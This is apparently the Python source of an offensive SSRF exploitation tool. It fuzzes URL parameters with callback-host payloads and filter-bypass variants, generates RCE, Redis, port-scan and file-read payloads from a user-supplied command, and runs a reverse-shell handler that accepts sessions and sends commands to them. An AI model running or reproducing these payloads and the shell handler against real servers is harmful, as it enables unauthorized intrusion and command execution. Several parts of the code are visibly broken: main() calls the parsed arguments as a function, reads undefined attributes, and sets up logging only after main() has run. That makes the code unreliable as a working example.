from banner.banner import banner
import urllib.parse
import urllib3
import regex
import argparse
import requests
import time
import os
import threading
import random
import logging
import re
import json
import socket
import sys
import base64

execPath = os.getcwd()
currentPath = os.path.dirname(__file__)
os.chdir(currentPath)

FUZZ_PLACE_HOLDER = '??????'
TIMEOUT_DELAY = 5
LOCK = threading.Lock()

banner()

example_text = '''Example: 
python3 ssrf-exploition.py -u https://example.com/
python3 ssrf-exploition.py -u https://example.com/ -m redis
python3 ssrf-exploition.py -u https://example.com/ -m portscan
python3 ssrf-exploition.py -u https://example.com/ -m readfiles --rfile
python3 ssrf-exploition.py -u https://example.com/ -m portscan --ssl --uagent "SSRFexploitAgent"
python3 ssrf-exploition.py -u https://example.com/ -m redis --lhost=127.0.0.1 --lport=8080 -l 8080
python3 ssrf-exploition.py -d data/request.txt -u https://example.com/ -m redis
python3 ssrf-exploition.py -u https://example.com/ -cn subdomain.collaborator.net -m canary
python3 ssrf-exploition.py -u https://example.com/ -cn https://subdomain.collaborator.net --mode canary -e 2
python3 ssrf-exploition.py -f addresses.txt -c 'touch vrechson' --mode rce -Fl Jira
python3 ssrf-exploition.py -f addresses.txt -c 'touch vrechson' --mode rce -p https -v


'''
parser = argparse.ArgumentParser(epilog=example_text, formatter_class=argparse.RawDescriptionHelpFormatter)
parser.add_argument("--file", "-f", metavar="TARGET_FILE", nargs="?", help="Set the target list containing internal domain names or IP addresses")
parser.add_argument("--url", "-u", type=str, required=False, help= 'url to be tested against SSRF')
parser.add_argument("--threads", "-n", type=int, required=False, help= 'number of threads for the tool')
parser.add_argument("--output", "-o", type=str, required=False, help='output file path')
parser.add_argument("--data", "-d", action="store", dest="reqfile", help="SSRF Request File")
parser.add_argument("--protocol", "-p", metavar="PROTOCOL", nargs="?", default="http://", help="Set the internal address protocol.\ndefault is http://")
parser.add_argument("--moudle", "-m", action="store", dest="moudles", help="SSRF Moudles to enable")
parser.add_argument("--canary", "-cn", metavar="CANARY_ADDRESS", nargs="?", help="Set canary address to confirm internal services")
parser.add_argument("--command", "-c", metavar="COMMAND", nargs="?", default="", help="Set the command to be executed")
parser.add_argument("--encode", "-e", metavar="ENCODE_LEVEL", nargs="?", default="1", help="Set the payload's URLencode level,ex:\n-e 0 will not encode the payload\n-e 2 will double URLencode the output")
parser.add_argument("--filter", "-Fl", metavar="FILTER", nargs="*", default=["shellshock"], help="Filter category, framework or a specific payload from the results\ndefault: exclude Shellshock payloads")
parser.add_argument("--handler", "-l", action="store", dest="handler", help="Start an handler for a reverse shell" )
parser.add_argument("--OAuth", "--ar", help="Aurhotization request URL ending with redirect_uri=", required=False)
parser.add_argument("--oneshot", "-t", action='store_true', help='fuzz with only one basic payload - to be activated in case of time constraints')
parser.add_argument("--rfiles", "-r", action="store", dest="targetfiles", help="Files to read with readfiles moudle" )
parser.add_argument("--verbose", "-v", action='store_true', help='activate verbose mode' )
parser.add_argument("--mode", metavar="MODE", nargs="?", default="canary", help="There are currently three supported modes:\ncanary (deafult mode: generate canary payloads)\nrce (generate payloads that can lead to RCE)\nall (generates RCE and Canary payloads)")
parser.add_argument("--lhost", action="store", dest="lhost", help="LHOST reverse shell")
parser.add_argument("--lport", action="store", dest="lport", help="LPORT reverse shell")
parser.add_argument("--ssl",   action ='store', dest='ssl', help="Use HTTPS without verification", )
parser.add_argument("--proxy",   action ='store', dest='proxy', help="Use HTTP(s) proxy (ex: http://localhost:8080)")
parser.add_argument("--level", action ='store', dest='level', help="Level of test to perform (1-5, default: 1)", default=1, type=int)
parser.add_argument("--uagent", action="store", dest="useragent", help="useragent to use")


args = parser.parse_args()

if not (args.file or args.url):
    parser.error('No input selected: Please add --file or --url as arguments.')

if not os.path.isdir('output'):
    os.system("mkdir output")

if not os.path.isdir('output/threadsLogs'):
    os.system("mkdir output/threadsLogs")
else:
    os.system("rm -r output/threadsLogs")
    os.system("mkdir output/threadsLogs")

if args.output:
    outputFile = open(f"{execPath}/{args.output}", "a")
else:
    outputFile = open("output/ssrf-result.txt", "a")

if args.file:
    allURLs = [line.replace('\n', '') for line in open(f"{execPath}/{args.file}", "r")]

regexParams = regex.compile('(?<=(access|dbg|debug|edit|grant|clone|exec|execute|load|make|modify|reset|shell|toggle|adm|root|cfg|dest|redirect|uri|path|continue|url|window|next|data|site|html|validate|domain|callback|return|host|port|to|out|view|dir|show|navigation|open|file|document|folder|pg|php_path|doc|img|filename|file_name|image)=)(.*)(?=(&|$))', flags=regex.IGNORECASE)

extractInteractionServerURL = "(?<=] )([a-z0-9][a-z0-9][a-z0-9].*)"


class Handler(threading.Thread):

    def __init__(self, host, port):
        threading.Thread.__init__(self)
        logging.info(f"Handler listening on {host}:{port}")
        self.connected = False
        self.port = int(port)
        self.host = str(host)

    def run(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.host, self.port))

        while True:
            self.socket.listen(5)
            self.client, address = self.socket.accept()
            print(f"Handler> New session from {address[0]}")
            self.connected = True

            response = self.client.recv(255)
            while response != b"":
                print(f"\n{response.decode('utf_8', 'ignore').strip()}\nShell > $ ", end='')
                response = self.client.recv(255)

    def listen_command(self):
        if self.connected == True:
            cmd = input("Shell> $ ")
            if cmd == "exit":
                self.kill()
                print("BYE !")
                exit()
                self.send_command(cmd+"\n\n")

    def send_command(self, cmd):
        self.client.sendall(cmd.encode())

    def kill(self):
        self.client.close()
        self.socket.close()


class Requester(object):
    protocol   = "http"
    host       = ""
    method     = ""
    action     = ""
    headers    = {}
    data       = {}

    def __init__(self, path, uagent, ssl, proxies):
        try:
            # Read file request
            with open(path, 'r') as f:
                content = f.read().strip()
        except IOError as e:
            logging.error("File not found")
            exit()

        try:
            content = content.split('\n')
            # Parse method and action URI
            regex = re.compile('(.*) (.*) HTTP')
            self.method, self.action = regex.findall(content[0])[0]

            # Parse headers
            for header in content[1:]:
                name, _, value = header.partition(': ')
                if not name or not value:
                    continue
                self.headers[name] = value
            self.host = self.headers['Host']

            # Parse user-agent        
            if uagent != None:
                self.headers['User-Agent'] = uagent
            
            # Parse data
            self.data_to_dict(content[-1])

            # Handling HTTPS requests
            if ssl == True:
                self.protocol   = "https"
            
            self.proxies = proxies

        except Exception as e:
            logging.warning("Bad Format or Raw data !")


    def data_to_dict(self, data):
        if self.method == "POST":

            # Handle JSON data
            if self.headers['Content-Type'] and "application/json" in self.headers['Content-Type']:
                self.data = json.loads(data)

            # Handle XML data
            elif self.headers['Content-Type'] and "application/xml" in self.headers['Content-Type']:
                self.data['__xml__'] = data

            # Handle FORM data
            else:
                for arg in data.split("&"):
                    regex = re.compile('(.*)=(.*)')
                    for name,value in regex.findall(arg):
                        name = urllib.parse.unquote(name)
                        value = urllib.parse.unquote(value)
                        self.data[name] = value


    def do_request(self, param, value, timeout=3, stream=False):
        try:
            if self.method == "POST":
                # Copying data to avoid multiple variables edit
                data_injected = self.data.copy()

                if param in str(data_injected): # Fix for issue/10 : str(data_injected)
                    data_injected[param] = value
            
                    # Handle JSON data
                    if self.headers['Content-Type'] and "application/json" in self.headers['Content-Type']:
                        r = requests.post(
                            self.protocol + "://" + self.host + self.action, 
                            headers=self.headers, 
                            json=data_injected,
                            timeout=timeout,
                            stream=stream,
                            verify=False,
                            proxies=self.proxies
                        )

                    # Handle FORM data
                    else:
                        if param == '': data_injected = value
                        r = requests.post(
                            self.protocol + "://" + self.host + self.action, 
                            headers=self.headers, 
                            data=data_injected,
                            timeout=timeout,
                            stream=stream,
                            verify=False,
                            proxies=self.proxies
                        )
                else:
                    if self.headers['Content-Type'] and "application/xml" in self.headers['Content-Type']:
                        if "*FUZZ*" in data_injected['__xml__']:

                            # replace the injection point with the payload
                            data_xml = data_injected['__xml__']
                            data_xml = data_xml.replace('*FUZZ*', value)

                            r = requests.post(
                                self.protocol + "://" + self.host + self.action, 
                                headers=self.headers, 
                                data=data_xml,
                                timeout=timeout,
                                stream=stream,
                                verify=False,
                                proxies=self.proxies
                            )                            
                            
                        else:
                            logging.error("No injection point found ! (use -p)")
                            exit(1)  
                    else:
                        logging.error("No injection point found ! (use -p)")
                        exit(1)  
            else:
                # String is immutable, we don't have to do a "forced" copy
                regex = re.compile(param+"=([^&]+)")
                value = urllib.parse.quote(value, safe='')
                data_injected = re.sub(regex, param+'='+value, self.action)
                r = requests.get(
                    self.protocol + "://" + self.host + data_injected, 
                    headers=self.headers,
                    timeout=timeout,
                    stream=stream,
                    verify=False,
                    proxies=self.proxies
                )
        except Exception as e:
            logging.error(e)
            return None
        return r

    def __str__(self):
        text =  self.method + " "
        text += self.action + " HTTP/1.1\n"
        for header in self.headers:
            text += header + ": " + self.headers[header] + "\n"

        text += "\n\n"
        for data in self.data:
            text += data + "=" + self.data[data] + "&"
        return text[:-1]

class Gun:
    def __init__(self, target, file, command, encode_level, protocol, canary, mode, verbose, _filter):

        self._targets = []

        if target is not None:
            self._targets.append(self.add_protocol(target, protocol))
        else:
            with open(file) as f:
                for line in f:
                    line = line.strip()
                    self._targets.append(self.add_protocol(str(line), "http"))

        if canary is not None:
            self._canary = self.add_protocol(canary, protocol)
        else:
            self._canary = ''

        self._encode_level = int(encode_level)
        self._filter = _filter

        if mode == "canary":
            self._filter.append('http')
            self._filter.append('gopher')
        elif mode == "rce":
            self._filter.append('canaries')

        self._command = str(command)
        self._verbose = verbose
        self._crlf = "{canary}/ HTTP/1.1{newline}Connection:keep-alive{newline}Host:{canary_host}{newline}Content-Length: 1{newline}{newline}1{newline}"

    def reload(self):
        for line in self._targets:
            
            # format CRLF payloads
            self._crlf = self._crlf.format(canary = line, newline = '\\r\\n', canary_host = urllib.parse.urlparse(line).netloc)
            self.trigger(line)
    
    def trigger(self, target):
        payload_file = open('payloads/blind-ssrf-payloads.json') # remember to add dir here
        data = json.load(payload_file)

        for category in data['categories']:
            if category in self._filter:
                continue
            if self._verbose:
                print("[{}]:".format(category))
            for framework in data['categories'][category]:
                if framework in self._filter:
                    continue
                if self._verbose:
                    print("     [{}]:".format(framework))
                for payload in data['categories'][category][framework]:
                    if payload in self._filter:
                        continue
                    address = data['categories'][category][framework][payload]  \
                    .format(target_addr = target, canary_addr = self._canary, 
                    canary_urlencoded =  urllib.parse.quote(self._canary), crlf = self._crlf, newline = '\\r\\n',
                    target_host = urllib.parse.urlparse(target), command = self._command, command_b64encoded = base64.b64encode((self._command).encode('UTF-8')).decode('UTF-8'))

                    for i in range(self._encode_level):
                        address = urllib.parse.quote(address)

                    if self._verbose:    
                        print("             [{}]:\n{}".format(payload, address))
                    else:
                        print("{}".format(address))
    
    def add_protocol(self, target, protocol):
        if target.endswith("/"):
            target = target[:-1]
        if "//" not in target:
            if "//" not in protocol:
                target = protocol + "://" + target
            else:
                target = protocol + target

        return target

def getFileSize(fileID):
    interactionLogs = open(f"output/threadsLogs/interaction-logs{fileID}.txt", "r")
    return len(interactionLogs.read())

def getInteractionServer():

    id = random.randint(0, 999999)
    os.system(f"interactsh-client -pi 1 &> output/threadsLogs/interaction-logs{id}.txt &")
    time.sleep(2)
    interactionServer = None
    while not interactionServer:
        interactionLogs = open(f"output/threadsLogs/interaction-logs{id}.txt", "r")
        fileContent = interactionLogs.read()
        pastInteractionLogsSize = len(fileContent)
        interactionServer = regex.search(extractInteractionServerURL, fileContent)
        time.sleep(2)

    interactionServer = interactionServer.group()

    return interactionServer, id


def exception_verbose_message(exceptionType):
    if args.verbose:
        if exceptionType == "timeout":
            print("\nTimeout detected... URL skipped")
        elif exceptionType == "redirects":
            print("\nToo many redirects... URL skipped")
        elif exceptionType == "others":
            print("\nRequest error... URL skipped")

def splitURLS(threadsSize): #Multithreading

    splitted = []
    URLSsize = len(allURLs)
    width = int(URLSsize/threadsSize)
    if width == 0:
        width = 1
    endVal = 0
    i = 0
    while endVal != URLSsize:
        if URLSsize <= i + 2 * width:
            if len(splitted) == threadsSize - 2:
                endVal = int(i + (URLSsize - i)/2)
            else:
                endVal = URLSsize
        else:
            endVal = i + width

        splitted.append(allURLs[i: endVal])
        i += width

    return splitted


def generatePayloads(whitelistedHost, interactionHost):
    generated =[
    f"http://{interactionHost}",
    f"//{interactionHost}",
    f"http://{whitelistedHost}.{interactionHost}",      
    f"http://{interactionHost}?{whitelistedHost}",
    f"http://{interactionHost}/{whitelistedHost}",
    f"http://{interactionHost}%ff@{whitelistedHost}",
    f"http://{interactionHost}%ff.{whitelistedHost}",
    f"http://{whitelistedHost}%25253F@{interactionHost}",
    f"http://{whitelistedHost}%253F@{interactionHost}",
    f"http://{whitelistedHost}%3F@{interactionHost}",
    f"http://{whitelistedHost}@{interactionHost}",
    f"http://foo@{interactionHost}:80@{whitelistedHost}",
    f"http://foo@{interactionHost}%20@{whitelistedHost}",
    f"http://foo@{interactionHost}%09@{whitelistedHost}"
    ]
    return generated

def smart_extract_host(url, matchedElement):
    urlDecodedElem = requests.utils.unquote(matchedElement)
    hostExtractorRegex = '(?<=(https|http):\/\/)(.*?)(?=\/)'
    extractedHost = regex.search(hostExtractorRegex, urlDecodedElem)
    if not extractedHost:
        extractedHost = regex.search(hostExtractorRegex, url)

    return extractedHost.group()

def prepare_url_with_regex(url):

    replacedURL = regexParams.sub(FUZZ_PLACE_HOLDER, url)
    matchedElem = regexParams.search(url)

    if matchedElem:
        matchedElem = matchedElem.group()

    return replacedURL, matchedElem

def fuzz_SSRF(url, interactionServer, fileID):

    pastInteractionLogsSize = getFileSize(fileID)

    replacedURL, matchedElem = prepare_url_with_regex(url)

    if not matchedElem: 
        return

    if args.oneshot:
        payloadsList = [f"http://{interactionServer}"]
    else:
        host = smart_extract_host(url, matchedElem)
        payloadsList = generatePayloads(host, interactionServer)

    if args.verbose:
        if not args.threads:
            print(f" + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +")
        print(f"\nStarting fuzzing {replacedURL}")

    for payload in payloadsList:
        fuzz_and_detect_with_payload("FUZZ", replacedURL, payload, fileID)

    time.sleep(2)
    if isInteractionDetected(pastInteractionLogsSize, fileID):
        if args.verbose:
            print(f"\nSSRF identified in {replacedURL}. Determining valid payload ...")
        for payload in payloadsList:
            if fuzz_and_detect_with_payload("DETECT", replacedURL, payload, fileID):
                print(f"SSRF detected in {replacedURL} with payload {payload}.")
                with LOCK:
                    outputFile.write(f"SSRF detected in {replacedURL} with payload {payload}\n")
                return
    else:
        if args.verbose:
            print(f"\nNothing detected for {replacedURL}")

def fuzz_and_detect_with_payload(type ,url, payload, fileID):
    pastInteractionLogsSize = getFileSize(fileID)

    fuzzedUrl = url.replace(FUZZ_PLACE_HOLDER, payload)
    if args.verbose:
        if not args.threads:
            print(f"Testing payload: {payload}                                                          ", end="\r")
    requests.get(fuzzedUrl, timeout=TIMEOUT_DELAY)
    if type == "DETECT":
        time.sleep(2)
        return isInteractionDetected(pastInteractionLogsSize, fileID)

def isInteractionDetected(pastInteractionLogsSize, fileID):
    currentInteractionLogsSize = getFileSize(fileID)

    if currentInteractionLogsSize != pastInteractionLogsSize:
        return True

    return False

def sequential_url_scan(urlList):

    interactionServer, fileID = getInteractionServer()

    for url in urlList:
        try:
            fuzz_SSRF(url, interactionServer, fileID)
        except requests.exceptions.Timeout:
            exception_verbose_message("timeout")
        except requests.exceptions.TooManyRedirects:
            exception_verbose_message("redirects")
        except Exception as e: 
            print(f"{url} : {e}")
            exception_verbose_message("others")

def main():
    if args.url:
        try:
            sequential_url_scan([args.url])
        except Exception as e:
            print("\nInvalid URL")
    elif args.file:

        if not args.threads or args.threads == 1:
            sequential_url_scan(allURLs)

        else:
            workingThreads = []
            split = splitURLS(args.threads)
            for subList in split:
                t = threading.Thread(target=sequential_url_scan, args=[subList])
                t.start()
                workingThreads.append(t)
            for thread in workingThreads:
                thread.join()
    outputFile.close()
    args_t = args()
    _command = ''

    if args_t.mode and args_t.mode != "canary":
        if not args_t.command:
            print('the argument -c/--command is required to generate RCE payloads')
            exit()
        else:
            if int(args_t.encode) > -1:
                _command = urllib.parse.quote(args_t.command)
            else:
                _command = args_t.command
    
    if args_t.mode and args_t.mode == "canary":
        if not args_t.canary:
            print('the argument -cn/--canary is required to generate canary payloads')
            exit()
    
    gun = Gun(args_t.target, args_t.target_list, _command,
    args_t.encode, args_t.protocol, args_t.canary, args_t.mode, args_t.verbose, args_t.filter)

    gun.reload()


if __name__ == '__main__':
    main()
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    logging.basicConfig(
        level=logging.INFO,
        format="[%(levelname)s]:%(message)s",
        handlers=[
            logging.FileHandler("ssrf-exploit.log", mode='w'),
            logging.StreamHandler()
        ]
    )

    logging.addLevelName( logging.WARNING, "\033[1;31m%s\033[1;0m" % logging.getLevelName(logging.WARNING))
    logging.addLevelName( logging.ERROR, "\033[1;41m%s\033[1;0m" % logging.getLevelName(logging.ERROR))


